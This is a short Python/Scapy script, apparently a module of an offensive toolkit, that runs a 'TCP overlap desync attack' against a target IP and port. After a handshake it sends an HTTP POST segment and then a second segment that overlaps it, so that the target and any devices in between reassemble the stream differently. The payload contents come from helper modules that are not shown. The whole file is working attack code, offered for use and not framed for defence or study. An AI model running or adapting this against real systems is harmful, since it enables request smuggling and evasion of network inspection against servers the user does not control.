from scapy.all import *
from utils.tcp import tcp_handshake
from utils.payloads import get_basic_post, get_overlapping_segment

def run(target_ip, target_port):
    print("[*] Running TCP overlap desync attack...")

    src_port = RandShort()
    ip = IP(dst=target_ip)

    # Step 1: Handshake
    seq, ack = tcp_handshake(target_ip, target_port, src_port)

    # Step 2: Construct packets
    payload1 = get_basic_post()
    payload2 = get_overlapping_segment()

    pkt1 = TCP(sport=src_port, dport=target_port, flags='PA', seq=seq, ack=ack)
    pkt2 = TCP(sport=src_port, dport=target_port, flags='PA', seq=seq + 10, ack=ack)

    print("[+] Sending initial HTTP POST")
    send(ip/pkt1/payload1)

    print("[+] Sending overlapping TCP segment")
    send(ip/pkt2/payload2)
